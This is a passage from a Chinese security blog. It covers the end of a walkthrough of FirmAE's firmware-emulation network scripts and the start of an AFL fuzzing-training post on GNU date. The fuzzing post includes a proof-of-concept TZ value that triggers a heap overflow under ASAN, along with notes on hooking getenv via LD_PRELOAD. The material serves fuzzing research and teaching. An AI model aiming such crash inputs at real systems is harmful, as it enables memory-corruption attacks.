查询数据库</span><br><span class="line">    ./scripts/tar2db.py -i $IID -f ./images/$IID.tar.gz -h $PSQL_IP \</span><br><span class="line">        2&gt;&amp;1 &gt; $&#123;WORK_DIR&#125;/tar2db.log</span><br><span class="line">    t_end=&quot;$(date -u +%s.%N)&quot;</span><br><span class="line">    time_tar=&quot;$(bc &lt;&lt;&lt;&quot;$t_end-$t_start&quot;)&quot;</span><br><span class="line">    echo $time_tar &gt; $&#123;WORK_DIR&#125;/time_tar</span><br><span class="line"></span><br><span class="line">    t_start=&quot;$(date -u +%s.%N)&quot;</span><br><span class="line">    # 制作qemu镜像</span><br><span class="line">    ./scripts/makeImage.sh $IID $ARCH $FILENAME \</span><br><span class="line">        2&gt;&amp;1 &gt; $&#123;WORK_DIR&#125;/makeImage.log</span><br><span class="line">    t_end=&quot;$(date -u +%s.%N)&quot;</span><br><span class="line">    time_image=&quot;$(bc &lt;&lt;&lt;&quot;$t_end-$t_start&quot;)&quot;</span><br><span class="line">    echo $time_image &gt; $&#123;WORK_DIR&#125;/time_image</span><br><span class="line"></span><br><span class="line">    # ================================</span><br><span class="line">    # infer network interface</span><br><span class="line">    # ================================</span><br><span class="line">    t_start=&quot;$(date -u +%s.%N)&quot;</span><br><span class="line">    echo &quot;[*] infer network start!!!&quot;</span><br><span class="line">    # TIMEOUT is set in &quot;firmae.config&quot;. This TIMEOUT is used for initial</span><br><span class="line">    # log collection.</span><br><span class="line">    TIMEOUT=$TIMEOUT FIRMAE_NET=$&#123;FIRMAE_NET&#125; \</span><br><span class="line">      ./scripts/makeNetwork.py -i $IID -q -o -a $&#123;ARCH&#125; \</span><br><span class="line">      &amp;&gt; $&#123;WORK_DIR&#125;/makeNetwork.log</span><br><span class="line">    # run_debug.sh等实际上都是./run.sh的软连接</span><br><span class="line">    ln -s ./run.sh $&#123;WORK_DIR&#125;/run_debug.sh | true</span><br><span class="line">    ln -s ./run.sh $&#123;WORK_DIR&#125;/run_analyze.sh | true</span><br><span class="line">    ln -s ./run.sh $&#123;WORK_DIR&#125;/run_boot.sh | true</span><br><span class="line"></span><br><span class="line">    t_end=&quot;$(date -u +%s.%N)&quot;</span><br><span class="line">    time_network=&quot;$(bc &lt;&lt;&lt;&quot;$t_end-$t_start&quot;)&quot;</span><br><span class="line">    echo $time_network &gt; $&#123;WORK_DIR&#125;/time_network</span><br><span class="line">else</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果之前仿真成功过则直接仿真</span></span><br><span class="line">    echo &quot;[*] $&#123;INFILE&#125; already succeed emulation!!!&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h2 id="makeNetwork-py：生成最终的qemu启动命令"><a href="#makeNetwork-py：生成最终的qemu启动命令" class="headerlink" title="makeNetwork.py：生成最终的qemu启动命令"></a>makeNetwork.py：生成最终的qemu启动命令</h2><p><code>makeNetwork.py</code>是进行网络处理的python脚本，里面大概包含了首次通过命令启动qemu虚拟机、然后分析qemu虚拟机的启动日志、生成新的启动参数、通过新的qemu命令再次启动虚拟机，并检查虚拟机的web服务器启动状况。</p>
<p><code>makeNetwork.py</code>中调用的关键函数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">main</span><br><span class="line">  -&gt; process</span><br><span class="line">    -&gt; inferNetwork</span><br><span class="line">    -&gt; checkNetwork</span><br></pre></td></tr></table></figure>
<h3 id="inferNetwork函数：首次启动QEMU虚拟机并分析启动日志"><a href="#inferNetwork函数：首次启动QEMU虚拟机并分析启动日志" class="headerlink" title="inferNetwork函数：首次启动QEMU虚拟机并分析启动日志"></a>inferNetwork函数：首次启动QEMU虚拟机并分析启动日志</h3><h4 id="1-首次启动虚拟机"><a href="#1-首次启动虚拟机" class="headerlink" title="1. 首次启动虚拟机"></a>1. 首次启动虚拟机</h4><p><code>inferNetwork</code>函数会重新挂载qemu磁盘，获取磁盘文件系统中的一些启动服务，在文件系统中修改<code>preInit.sh</code>脚本，并生成QEMU启动命令。QEMU启动命令会增加<code>rdinit=/firmadyne/preInit.sh</code>参数，使得虚拟机启动后会首先去执行该脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Running firmware %d: terminating after %d secs...&quot;</span> % (iid, TIMEOUT))</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;timeout --preserve-status --signal SIGINT &#123;0&#125; &quot;</span>.<span class="built_in">format</span>(TIMEOUT)</span><br><span class="line">cmd += <span class="string">&quot;&#123;0&#125;/run.&#123;1&#125;.sh \&quot;&#123;2&#125;\&quot; \&quot;&#123;3&#125;\&quot; &quot;</span>.<span class="built_in">format</span>(SCRIPTDIR,</span><br><span class="line">                                                arch + endianness,</span><br><span class="line">                                                iid,</span><br><span class="line">                                                qemuInitValue)</span><br><span class="line">cmd += <span class="string">&quot; 2&gt;&amp;1 &gt; /dev/null&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(SCRATCHDIR + <span class="string">&quot;/&quot;</span> + <span class="built_in">str</span>(iid) + <span class="string">&quot;/qemu.init.cmd&quot;</span>, <span class="string">&quot;w+&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    out.write(cmd)</span><br><span class="line"><span class="comment"># 首次执行虚拟机，设置了时间上的延迟，因此这个地方的时间是必须等待的</span></span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure>

<p>首次执行的qemu虚拟机启动命令如下，这次仿真所消耗的时间就是6分钟：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout --preserve-status --signal SIGINT 240 /home/utest/app/FirmAE/scripts/run.mipseb.sh &quot;3&quot; &quot;rdinit=/firmadyne/preInit.sh&quot;  2&gt;&amp;1 &gt; /dev/null</span><br></pre></td></tr></table></figure>

<p>我从一个已经启动的虚拟机中查看脚本内容如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/firmadyne/sh</span></span><br><span class="line"></span><br><span class="line">BUSYBOX=/firmadyne/busybox</span><br><span class="line"></span><br><span class="line">[ -d /dev ] || <span class="built_in">mkdir</span> -p /dev</span><br><span class="line">[ -d /root ] || <span class="built_in">mkdir</span> -p /root</span><br><span class="line">[ -d /sys ] || <span class="built_in">mkdir</span> -p /sys</span><br><span class="line">[ -d /proc ] || <span class="built_in">mkdir</span> -p /proc</span><br><span class="line">[ -d /tmp ] || <span class="built_in">mkdir</span> -p /tmp</span><br><span class="line"><span class="built_in">mkdir</span> -p /var/lock</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;BUSYBOX&#125;</span> mount -t sysfs sysfs /sys</span><br><span class="line"><span class="variable">$&#123;BUSYBOX&#125;</span> mount -t proc proc /proc</span><br><span class="line"><span class="variable">$&#123;BUSYBOX&#125;</span> <span class="built_in">ln</span> -sf /proc/mounts /etc/mtab</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line"><span class="variable">$&#123;BUSYBOX&#125;</span> mount -t devpts devpts /dev/pts</span><br><span class="line"><span class="variable">$&#123;BUSYBOX&#125;</span> mount -t tmpfs tmpfs /run</span><br><span class="line"></span><br><span class="line">/sbin/init &amp;</span><br><span class="line"></span><br><span class="line">/firmadyne/network.sh &amp;</span><br><span class="line">/firmadyne/run_service.sh &amp;</span><br><span class="line">/firmadyne/debug.sh</span><br><span class="line">/firmadyne/busybox <span class="built_in">sleep</span> 36000</span><br></pre></td></tr></table></figure>

<p>可以看到脚本会创建一些必备的目录以提高仿真生成率（来自FirmAE论文，有数据证实），并挂载一些设备。然后执行文件系统中的<code>/sbin/init</code>，这个或许在真实设备中是首次执行的程序。最后会运行内置的一些脚本，启动<code>debug.sh</code>是FirmAE较FirmAdyne所没有的。还有一个sleep命令，应该是为了等待启动成功。</p>
<h4 id="2-分析启动日志"><a href="#2-分析启动日志" class="headerlink" title="2. 分析启动日志"></a>2. 分析启动日志</h4><p>虚拟机首次执行是有时间限制的，时间到后关闭虚拟机。随后<code>inferNetwork</code>函数会分析qemu启动日志，从中得到例如开放端口、IP、MAC地址改变等信息，然后返回。FirmAE的内核源码是被修改过的，对一些关键系统调用做了hook，因此是可以在qemu启动日志中得到许多信息。这些信息随后会辅助生成最终的qemu启动命令。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开始分析qemu虚拟机首次启动的日志</span></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;%s/qemu.initial.serial.log&quot;</span> % targetDir, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找开放端口</span></span><br><span class="line">ports = findPorts(data, endianness)</span><br><span class="line"></span><br><span class="line"><span class="comment">#find interfaces with non loopback ip addresses</span></span><br><span class="line">ifacesWithIps = findNonLoInterfaces(data, endianness)</span><br><span class="line"><span class="comment">#find changes of mac addresses for devices</span></span><br><span class="line"><span class="comment"># 寻找MAC地址的变化</span></span><br><span class="line">macChanges = findMacChanges(data, endianness)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Interfaces: %r&#x27;</span> % ifacesWithIps)</span><br><span class="line"></span><br><span class="line">networkList = getNetworkList(data, ifacesWithIps, macChanges)</span><br><span class="line"><span class="keyword">return</span> qemuInitValue, networkList, targetFile, targetData, ports</span><br></pre></td></tr></table></figure>

<h3 id="checkNetwork函数"><a href="#checkNetwork函数" class="headerlink" title="checkNetwork函数"></a>checkNetwork函数</h3><p>继续返回到<code>process</code>函数中，接下来会调用<code>checkNetwork</code>函数。该函数的主要功能是从<code>inferNetwork</code>函数提取的日志信息<code>networkList</code>中分析虚拟机的网络类型。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> vlanNetworkList:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;has vlan ethernet&quot;</span>)</span><br><span class="line">    filterNetworkList = vlanNetworkList</span><br><span class="line">    result = <span class="string">&quot;normal&quot;</span></span><br><span class="line"><span class="keyword">elif</span> ethNetworkList:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;has ethernet&quot;</span>)</span><br><span class="line">    filterNetworkList = ethNetworkList</span><br><span class="line">    result = <span class="string">&quot;normal&quot;</span></span><br><span class="line"><span class="keyword">elif</span> invalidEthNetworkList:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;has ethernet and invalid IP&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> (ip, dev, vlan, mac, brif) <span class="keyword">in</span> invalidEthNetworkList:</span><br><span class="line">        filterNetworkList.append((<span class="string">&#x27;192.168.0.1&#x27;</span>, dev, vlan, mac, brif))</span><br><span class="line">    result = <span class="string">&quot;reload&quot;</span></span><br><span class="line"><span class="keyword">elif</span> brNetworkList:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;only has bridge interface&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> (ip, dev, vlan, mac, brif) <span class="keyword">in</span> brNetworkList:</span><br><span class="line">        <span class="keyword">if</span> devList:</span><br><span class="line">            dev = devList.pop(<span class="number">0</span>)</span><br><span class="line">            filterNetworkList.append((ip, dev, vlan, mac, brif))</span><br><span class="line">    result = <span class="string">&quot;bridge&quot;</span></span><br><span class="line"><span class="keyword">elif</span> invalidBrNetworkList:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;only has bridge interface and invalid IP&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> (ip, dev, vlan, mac, brif) <span class="keyword">in</span> invalidBrNetworkList:</span><br><span class="line">        <span class="keyword">if</span> devList:</span><br><span class="line">            dev = devList.pop(<span class="number">0</span>)</span><br><span class="line">            filterNetworkList.append((<span class="string">&#x27;192.168.0.1&#x27;</span>, dev, vlan, mac, brif))</span><br><span class="line">    result = <span class="string">&quot;bridgereload&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="test-emulation-sh：第二次启动虚拟机并分析网络仿真结果"><a href="#test-emulation-sh：第二次启动虚拟机并分析网络仿真结果" class="headerlink" title="test_emulation.sh：第二次启动虚拟机并分析网络仿真结果"></a>test_emulation.sh：第二次启动虚拟机并分析网络仿真结果</h3><p>通过首次仿真的结果，我们可以得到一系列的信息，例如网络列表、端口等等。这些信息将用于生成最终的qemu启动命令。如下还是<code>process</code>函数中，根据首次仿真的日志得到一些关键信息，用于生成最后的仿真命令<code>qemuCommandLine</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">qemuCommandLine = qemuCmd(iid,</span><br><span class="line">                          filterNetworkList,</span><br><span class="line">                          ports,</span><br><span class="line">                          network_type,</span><br><span class="line">                          arch,</span><br><span class="line">                          endianness,</span><br><span class="line">                          qemuInitValue,</span><br><span class="line">                          isUserNetwork)</span><br><span class="line"><span class="comment"># 重新生成了QEMU命令</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(outfile, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">    out.write(qemuCommandLine)</span><br><span class="line">os.chmod(outfile, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;./scripts/test_emulation.sh &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(iid, arch + endianness))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (os.path.exists(SCRATCHDIR + <span class="string">&#x27;/&#x27;</span> + <span class="built_in">str</span>(iid) + <span class="string">&#x27;/web&#x27;</span>) <span class="keyword">and</span></span><br><span class="line">    <span class="built_in">open</span>(SCRATCHDIR + <span class="string">&#x27;/&#x27;</span> + <span class="built_in">str</span>(iid) + <span class="string">&#x27;/web&#x27;</span>).read().strip() == <span class="string">&#x27;true&#x27;</span>):</span><br><span class="line">    success = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>随后调用<code>test_emulation.sh</code>去执行这条仿真命令，该虚拟机启动命令在后台执行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;[*] test emulator&quot;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;WORK_DIR&#125;/run.sh 2&gt;&amp;1 &gt;<span class="variable">$&#123;WORK_DIR&#125;</span>/emulation.log &amp;</span></span><br><span class="line"></span><br><span class="line">sleep 10</span><br></pre></td></tr></table></figure>

<p>脚本还会调用<code>check_network</code>函数检查虚拟机的网络仿真状态，主要是通过ping和访问web服务端口来判断：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;[*] Waiting web service... from $&#123;IPS[@]&#125;&quot;</span><br><span class="line">read IP PING_RESULT WEB_RESULT TIME_PING TIME_WEB &lt; &lt;(check_network &quot;$&#123;IPS[@]&#125;&quot; false)</span><br><span class="line"></span><br><span class="line">if ($&#123;PING_RESULT&#125;); then</span><br><span class="line">    echo true &gt; $&#123;WORK_DIR&#125;/ping</span><br><span class="line">    echo $&#123;TIME_PING&#125; &gt; $&#123;WORK_DIR&#125;/time_ping</span><br><span class="line">    echo $&#123;IP&#125; &gt; $&#123;WORK_DIR&#125;/ip</span><br><span class="line">fi</span><br><span class="line">if ($&#123;WEB_RESULT&#125;); then</span><br><span class="line">    echo true &gt; $&#123;WORK_DIR&#125;/web</span><br><span class="line">    echo $&#123;TIME_WEB&#125; &gt; $&#123;WORK_DIR&#125;/time_web</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p><code>check_network</code>函数的代码如下，循环通过ping判断虚拟机是否存活，以及通过curl判断WEB服务是否启动起来，然后写入到固件工作目录的状态文件：<code>$&#123;WORK_DIR&#125;/ping</code>和<code>$&#123;WORK_DIR&#125;/web</code>中。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">check_network () &#123;</span><br><span class="line">    sleep 10</span><br><span class="line"></span><br><span class="line">    IPS=(&quot;$&#123;@&#125;&quot;)</span><br><span class="line">    DEBUG_MODE=$&#123;IPS[-1]&#125;</span><br><span class="line">    unset &#x27;IPS[$&#123;#IPS[@]&#125;-1]&#x27;</span><br><span class="line"></span><br><span class="line">    PING_RESULT=false</span><br><span class="line">    PING_TIME=-1</span><br><span class="line">    WEB_RESULT=false</span><br><span class="line">    WEB_TIME=-1</span><br><span class="line">    RET_IP=&quot;None&quot;</span><br><span class="line"></span><br><span class="line">    START_TIME=$(date +%s | bc)</span><br><span class="line">    CURRENT_TIME=$(date +%s | bc)</span><br><span class="line">    t_start=$(date +%s.%N)</span><br><span class="line">    while [ $&#123;CURRENT_TIME&#125; -le $[$&#123;START_TIME&#125; + $&#123;CHECK_TIMEOUT&#125;] ]</span><br><span class="line">    do</span><br><span class="line">        for IP in &quot;$&#123;IPS[@]&#125;&quot;</span><br><span class="line">        do</span><br><span class="line">            if (curl --max-time 2 --output /dev/null --silent http://$&#123;IP&#125; || curl --max-time 2 --output /dev/null --silent https://$&#123;IP&#125;); then</span><br><span class="line">                t_end=$(date +%s.%N)</span><br><span class="line">                if (! $&#123;WEB_RESULT&#125;); then</span><br><span class="line">                    WEB_TIME=$(echo &quot;$t_end - $t_start&quot; | bc)</span><br><span class="line">                fi</span><br><span class="line">                if (! $&#123;PING_RESULT&#125;); then</span><br><span class="line">                    PING_TIME=$&#123;WEB_TIME&#125;</span><br><span class="line">                fi</span><br><span class="line">                PING_RESULT=true</span><br><span class="line">                WEB_RESULT=true</span><br><span class="line">                RET_IP=$&#123;IP&#125;</span><br><span class="line">            fi</span><br><span class="line">            if (ping -c 1 $&#123;IP&#125; &gt; /dev/null); then</span><br><span class="line">                t_end=$(date +%s.%N)</span><br><span class="line">                if (! $&#123;PING_RESULT&#125;); then</span><br><span class="line">                    PING_TIME=$(echo &quot;$t_end - $t_start&quot; | bc)</span><br><span class="line">                fi</span><br><span class="line">                PING_RESULT=true</span><br><span class="line">                RET_IP=$&#123;IP&#125;</span><br><span class="line">            fi</span><br><span class="line">            sleep 1</span><br><span class="line">            CURRENT_TIME=$(date +%s | bc)</span><br><span class="line">        done</span><br><span class="line"></span><br><span class="line">        if ($&#123;WEB_RESULT&#125;); then</span><br><span class="line">            break</span><br><span class="line">        fi</span><br><span class="line">    done</span><br><span class="line"></span><br><span class="line">    echo &quot;$&#123;RET_IP&#125;&quot; &quot;$&#123;PING_RESULT&#125;&quot; &quot;$&#123;WEB_RESULT&#125;&quot; &quot;$&#123;PING_TIME&#125;&quot; &quot;$&#123;WEB_TIME&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，关键脚本<code>makeNetwork.py</code>分析完成。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以前在看FirmAE论文的时候，论文中强调仿真采用了启发式的分析方法，其实这个启发式主要就是对固件的文件系统和网络进行分析，然后进行相应的patch。</p>
<p>对于文件系统，FirmAE会分析其中的web服务、服务程序中所需的文件和文件夹和设备、然后生成脚本在启动时创建相应的文件和文件夹，挂载相应的设备。对于网络配置，FirmAE会在分析阶段启动两次qemu虚拟机。第一次是为了获取到网络配置信息，然后生成新的qemu启动命令；第二次是为了判断虚拟机是否被启动、web服务是否被启动。</p>
<p>综合来说，FirmAE的时间消耗大头是在网络配置上，要是不顺利的话，第一次网络启动会默认消耗6分钟、第二次也会消耗6分钟。而且，FirmAE真正启动还会再执行一次qemu虚拟机的启动，也就是说，从固件到仿真成功，一共需要执行三次qemu虚拟机。</p>
<p>出于个人需求，FirmAE对我来说在判断逻辑上还可以改改。例如有时候WEB服务着实启动条件比较苛刻，需要对WEB程序进行patch，这种场景下我们实际上只想让FirmAE快速搭建起来一个qemu虚拟机，在网络判定的时候ping能够ping通就行，web服务可以自己连接到虚拟机上去手动启动。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/[afl-training]%20date/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/%5Bafl-training%5D%20date/" class="post-title-link" itemprop="url">[afl-training] date</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-13 10:23:03 / Modified: 10:26:29" itemprop="dateCreated datePublished" datetime="2023-04-13T10:23:03+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="afl-training-date"><a href="#afl-training-date" class="headerlink" title="[afl-training] date"></a>[afl-training] date</h1><p>date 的这个漏洞也是使用 AFL 发现的。通过查看 date 的 man 手册，可以看到 date 可以从命令行、日期相关系统调用、环境变量和一些文件中读取输入。此次 challenge 是如何对一个程序的环境变量进行 fuzz，个人还是比较重视这个 challenge，因为我的毕业设计是打算对 IoT 固件中的 CGI 程序进行模糊测试，而 CGI 程序大多是从环境变量以及标准输入 STDIN 中获取数据，然后处理完毕后通过标准输出 STDOUT 输出，做完这个 challenge 应该就可以开始进行毕业设计的总体实现了。</p>
<h2 id="编译-date"><a href="#编译-date" class="headerlink" title="编译 date"></a>编译 date</h2><p>首先对 date 的源码进行编译，和之前的 challenge 类似，需要使用 afl-clang-fast 以及开启 AFL_USE_ASAN&#x3D;1 编译选项。</p>
<p>进入 challenge 中的 date 目录，下载源码，并编译时必要的依赖。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git submodule init &amp;&amp; git submodule update</span><br><span class="line">sudo apt install autopoint bison gperf autoconf texinfo</span><br></pre></td></tr></table></figure>

<p>编译 date</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd coreutils</span><br><span class="line">./bootstrap</span><br><span class="line">patch --follow-symlinks -p1 &lt; ../coreutils-8.29-gnulib-fflush.patch</span><br><span class="line">CC=afl-clang-fast ./configure # 如果是root用户编译加上FORCE_UNSAFE_CONFIGURE=1选项</span><br><span class="line">AFL_USE_ASAN=1 make</span><br></pre></td></tr></table></figure>

<p>运行编译出来的带有 bug 的 date 程序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./src/date</span><br><span class="line">TZ=&#x27;Asia/Tokyo&#x27; ./src/date # 加上环境变量TZ</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-102333584.png" alt="undifined"></p>
<p>目前是已知 TZ 环境变量存在 bug，那么运行 poc，ASAN 报错发生堆溢出</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TZ=&quot;aaa00000000000000000000aaaaaab00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot; ./src/date --date &quot;2017-03-14 15:00 UTC&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-102348762.png" alt="undifined"></p>
<h2 id="harness"><a href="#harness" class="headerlink" title="harness"></a>harness</h2><p>那么问题就是如何对环境变量进行 fuzz。在每一个 challenge 中都有一个 HINT.md 文档，作为对当前挑战的提示。对于如何 fuzz 环境变量，HINT.md 提出了三个方案：</p>
<ol>
<li>在源码中找到所有读取环境变量 TZ 的地方，然后替换为从 STDIN 中读取</li>
<li>修改 main 函数，在运行之初就设置 TZ 环境变量从 STDIN 中读取</li>
<li>使用 LD_PRELOAD 环境变量对 getenv 函数进行劫持，这样就可以通过标准输入传递到环境变量的值</li>
</ol>
<p>在 ANSWERS.md 中，推荐使用的是第二个方案，因为第一个方案需要对代码中每一个读取环境变量的地方进行修改，很难确定每个地方都替换了为了 STDIN；第三个方案虽然重用性比较高，但是对于入门而言，需要花费的功夫还是比较多的。我在毕设中应该会使用到第三种方案，因为这样可以最大限度不对 CGI 的程序做出修改。</p>
<p>使用第二个方案的一个原因也是，date.c 代码中，只有一个使用到了 getenv(“TZ”)，那么在 main 函数运行之初，就提前设定好 TZ 环境变量从 STDIN 中读取，从而实现 fuzz 环境变量的值从标准输入中读取。在 main 函数中增加如下：</p>
